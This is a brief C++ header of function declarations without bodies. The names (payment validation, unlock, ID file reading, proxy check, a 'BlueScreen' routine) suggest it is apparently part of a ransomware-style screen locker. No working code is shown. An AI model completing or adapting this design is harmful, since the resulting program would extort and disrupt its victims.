#pragma once
#include <iostream>
std::string readIdFile();
std::string getStatus();
std::string getPaymentValidation();
void Unlock(std::string status);
void GetDesktopResolution(int& horizontal, int& vertical);
bool checkProxyCon();
void BlueScreen();